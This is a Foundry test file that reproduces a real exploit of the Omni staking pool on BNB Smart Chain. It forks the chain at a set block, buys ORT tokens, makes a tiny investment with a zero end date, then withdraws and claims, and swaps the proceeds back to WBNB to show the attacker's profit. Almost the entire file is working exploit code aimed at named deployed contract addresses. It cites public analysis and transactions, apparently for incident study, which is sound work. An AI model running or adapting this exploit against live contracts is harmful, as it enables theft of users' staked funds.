// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1615232012834705408
// @TX
// invest
// https://bscscan.com/tx/0x49bed801b9a9432728b1939951acaa8f2e874453d39c7d881a62c2c157aa7613
// withdraw
// https://bscscan.com/tx/0xa916674fb8203fac6d78f5f9afc604be468a514aa61ea36c6d6ef26ecfbd0e97

interface OmniStakingPool {
    function invest(uint256 end_date, uint256 qty_ort) external;
    function withdrawAndClaim(uint256 lockId) external;
    function getUserStaking(address user) external returns (uint256[] memory);
}

contract ContractTest is Test {
    address Omni = 0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB;
    address ORT = 0x1d64327C74d6519afeF54E58730aD6fc797f05Ba;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    function setUp() public {
        vm.createSelectFork("bsc", 24_850_696);
    }

    function testExploit() public {
        // 1. get some ort token
        IWBNB(WBNB).deposit{value: 1e18}();
        emit log_named_decimal_uint("[Before Attacks] Attacker WBNB balance", WBNB.balanceOf(address(this)), 18);
        bscSwap(address(WBNB), ORT, 1e18);
        // 2. invest
        IERC20(ORT).approve(Omni, type(uint256).max);
        OmniStakingPool(Omni).invest(0, 1);
        uint256[] memory stake_ = OmniStakingPool(Omni).getUserStaking(address(this));
        // 3. withdraw
        OmniStakingPool(Omni).withdrawAndClaim(stake_[0]);

        // 4. profit
        bscSwap(ORT, address(WBNB), IERC20(ORT).balanceOf(address(this)));
        emit log_named_decimal_uint("[After Attacks]  Attacker WBNB balance", WBNB.balanceOf(address(this)), 18);
    }

    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
